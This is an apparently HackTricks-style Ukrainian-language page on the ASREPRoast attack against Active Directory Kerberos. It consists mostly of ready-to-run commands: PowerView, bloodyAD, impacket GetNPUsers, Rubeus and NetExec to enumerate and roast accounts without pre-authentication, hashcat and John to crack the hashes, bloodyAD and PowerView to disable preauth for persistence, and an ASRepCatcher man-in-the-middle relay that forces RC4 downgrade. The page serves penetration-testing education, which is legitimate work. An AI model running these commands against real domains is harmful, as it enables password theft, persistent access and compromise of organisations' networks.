# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast — це атака безпеки, яка експлуатує користувачів, у яких відсутній атрибут **Kerberos pre-authentication required**. По суті, ця вразливість дозволяє атакувальникам запитувати автентифікацію для користувача в Domain Controller (DC) без потреби в паролі користувача. Потім DC відповідає повідомленням, зашифрованим ключем, похідним від пароля користувача, який атакувальники можуть спробувати зламати офлайн, щоб дізнатися пароль користувача.

Основні вимоги для цієї атаки:

- **Відсутність Kerberos pre-authentication**: цільові користувачі не повинні мати ввімкнену цю функцію безпеки.
- **Підключення до Domain Controller (DC)**: атакувальникам потрібен доступ до DC, щоб надсилати запити та отримувати зашифровані повідомлення.
- **Необов'язковий доменний обліковий запис**: наявність доменного облікового запису дозволяє атакувальникам ефективніше визначати вразливих користувачів через LDAP-запити. Без такого облікового запису атакувальникам доведеться вгадувати імена користувачів.

#### Перелічення вразливих користувачів (потрібні доменні облікові дані)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Запит AS_REP message
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus requests **RC4** by default, so Event ID **4768** usually shows **preauth type 0** and **ticket encryption type 0x17**. If you add **`/aes`** (or RC4 is disabled for the target), expect **AES etypes** instead.

#### Quick one-liners (Linux)

- Перелічіть потенційні цілі спочатку (наприклад, із leak-нутих шляхів білдів) за допомогою Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast-ніть весь список username без valid creds за допомогою NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- Якщо у вас є creds, дозвольте NetExec запитати LDAP і отримати для вас кожен roastable account: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- Якщо output починається з **`$krb5asrep$23$`**, зламуйте його за допомогою Hashcat **`-m 18200`**. Якщо він починається з **`$krb5asrep$17$`** або **`$krb5asrep$18$`**, краще використовуйте John **`--format=krb5asrep`**.

### Cracking

Не припускайте, що кожен AS-REP roast — це RC4. Сучасні tools можуть повертати **RC4** (`$krb5asrep$23$`) або **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) залежно від requested/negotiated enctype. **`hashcat -m 18200`** — для **etype 23**, тоді як **John** напряму обробляє `krb5asrep` для **17/18/23**.
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Примусово встановіть, що **preauth** не потрібен для користувача, щодо якого у вас є права **GenericAll** (або права на запис властивостей):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast без credentials

Атакувальник може використати man-in-the-middle позицію, щоб перехоплювати пакети AS-REP під час їх проходження мережею, не покладаючись на те, що Kerberos pre-authentication вимкнено. Тому це працює для всіх users у VLAN.\
Якщо вам потрібен пов’язаний no-credential trick, який повертає **service ticket** замість **TGT** від no-preauth principal, див. [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) дозволяє це зробити. Режим `relay` є найцікавішим з offensive точки зору, тому що він може примусово вмикати **RC4**, коли client усе ще рекламує **etype 23**; `listen` залишається пасивним і просто захоплює те, що узгодили client/DC.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
